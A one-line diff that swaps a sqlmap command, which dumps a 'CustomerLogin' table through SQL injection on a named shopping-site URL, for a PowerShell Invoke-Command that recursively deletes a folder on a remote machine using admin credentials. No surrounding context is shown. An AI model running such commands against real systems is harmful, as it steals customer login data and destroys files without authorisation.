@@ -1,1 +1,1 @@
-sqlmap -u “http://www.luxurytreats.com/orderdetail.aspx?Id=1” -D Hotels -T CustomerLogin --dump
+Invoke-Command -ComputerName Windows10 -ScriptBlock { Remove-Item -path E:\MyFolder -recurse } -credential admin
